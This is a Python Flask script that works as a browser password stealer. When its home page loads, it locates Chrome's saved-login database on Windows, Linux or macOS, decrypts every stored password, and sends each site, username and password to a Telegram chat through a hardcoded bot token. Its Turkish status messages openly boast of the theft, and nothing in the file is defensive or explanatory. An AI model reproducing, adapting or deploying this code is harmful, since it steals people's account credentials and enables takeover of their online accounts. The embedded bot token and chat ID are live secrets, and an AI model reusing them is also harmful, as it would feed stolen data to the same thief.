# app.py
from flask import Flask
import telebot
import os
import sqlite3
import shutil
import json
import base64
import time
import platform

app = Flask(__name__)
bot = telebot.TeleBot("8258388271:AAEr5lwYGZppBtSRy-c3wXCWu4Dr_GwASfI")
CHAT_ID = 7323434112

def get_paths():
    system = platform.system()
    if system == "Windows":
        return [os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data")]
    elif system == "Linux":
        return [os.path.expanduser("~/.config/google-chrome/Default/Login Data")]
    elif system == "Darwin":
        return [os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data")]
    return []

def decrypt_win(encrypted):
    try:
        import win32crypt
        return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
    except:
        return "[Windows decrypt hata]"

def decrypt_aes(key, encrypted):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        iv = encrypted[3:15]
        ciphertext = encrypted[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
        decryptor = cipher.decryptor()
        return (decryptor.update(ciphertext) + decryptor.finalize()).decode()
    except:
        return "[AES decrypt hata]"

@app.route('/')
def home():
    bot.send_message(CHAT_ID, "REİS, PC CHROME ŞİFRELERİ ÇEKİLİYOR... 🔑")
    paths = get_paths()
    sifreler = []
    for db_path in paths:
        if not os.path.exists(db_path):
            continue
        local_state = db_path.replace("Login Data", "Local State")
        if not os.path.exists(local_state):
            continue
        try:
            with open(local_state, 'r', encoding='utf-8') as f:
                ls = json.load(f)
            enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]

            shutil.copy(db_path, "temp.db")
            conn = sqlite3.connect("temp.db")
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc in cur.fetchall():
                if platform.system() == "Windows":
                    pwd = decrypt_win(enc)
                else:
                    pwd = decrypt_aes(enc_key, enc)
                sifreler.append(f"Site: {url}\nUser: {user}\nPass: {pwd}")
            conn.close()
            os.remove("temp.db")
        except Exception as e:
            sifreler.append(f"Hata: {e}")
    
    if not sifreler:
        bot.send_message(CHAT_ID, "Şifre bulunamadı. Chrome kapalı mı? Profil doğru mu?")
    else:
        for sifre in sifreler:
            bot.send_message(CHAT_ID, sifre)
            time.sleep(0.5)
        bot.send_message(CHAT_ID, f"✅ {len(sifreler)} ŞİFRE GÖNDERİLDİ!")
    return "<h1>ŞİFRELER TELEGRAM'DA REİS!</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
